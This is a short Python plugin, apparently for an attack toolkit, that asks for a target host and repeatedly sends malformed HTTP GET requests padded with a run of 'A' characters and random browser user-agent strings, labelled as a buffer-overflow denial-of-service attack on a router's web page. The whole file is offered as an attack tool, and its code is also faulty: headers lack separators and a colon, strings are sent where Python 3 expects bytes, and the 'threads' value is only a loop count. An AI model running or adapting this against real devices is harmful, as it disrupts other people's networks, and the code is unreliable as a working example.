#!/usr/bin/env python3
Description = 'Dos a router webpage using buffer overflow attack'
from pluginsupport import *

rhost = ask('rhost')


def run():
    import socket, random, string
    user_agents = ['Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991',
    'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; A1-810 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
    'Mozilla/5.0 (Windows NT 5.1; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Mozilla/5.0 (PLAYSTATION 3 4.81) AppleWebKit/531.22.8 (KHTML, like Gecko)',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 OPR/48.0.2685.52',
    'Mozilla/5.0 (SMART-TV; X11; Linux armv7l) AppleWebKit/537.42 (KHTML, like Gecko) Chromium/25.0.1349.2 Chrome/25.0.1349.2 Safari/537.42',
    'Mozilla/5.0 (Windows NT 6.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.2.7 (KHTML, like Gecko)',
    'Mozilla/5.0 (PlayStation 4 5.01) AppleWebKit/601.2 (KHTML, like Gecko)',]

    target_host = rhost
    threads = 100
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_host, 80))
    payload = "A" * 100
    message = "GET " + payload + " HTTP/1.0"
    message += "Host: " + target_host + ":80"
    message += 'User-Agent' + random.choice(user_agents)
    try:
        text("Sending DOS Attack...")
        for i in range(1,int(threads)):
            sock.send(message)
            data = sock.recv(1024)
            data = sock.recv(1024)
            data += sock.recv(1024)
    except KeyboardInterrupt:
        fail("Closing connection.")
        sock.close()
        exit()

run()
